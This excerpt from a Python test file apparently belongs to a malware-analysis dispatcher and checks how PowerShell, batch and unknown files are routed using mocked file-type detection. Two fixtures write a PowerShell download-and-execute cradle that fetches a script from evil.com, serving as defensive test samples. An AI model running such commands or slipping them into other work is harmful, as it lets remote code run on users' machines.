...
def test_dispatch_to_script_ps1(tmp_path):
    ...
    f.write_text("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')")
...
def test_dispatch_to_script_bat(tmp_path):
    ...
    f.write_text("powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')\"")
    ...
    with patch("analysis.dispatcher.magic.from_file", return_value="text/x-msdos-batch"):
        result = dispatch(file_info)
...
def test_dispatch_to_generic_unknown(tmp_path):
    ...
    with patch("analysis.dispatcher.magic.from_file", return_value="application/octet-stream"):
        result = dispatch(file_info)
...
def test_dispatch_magic_failure():
    ...
    with patch("analysis.dispatcher.magic.from_file", side_effect=Exception("Magic error")):
        result = dispatch(file_info)
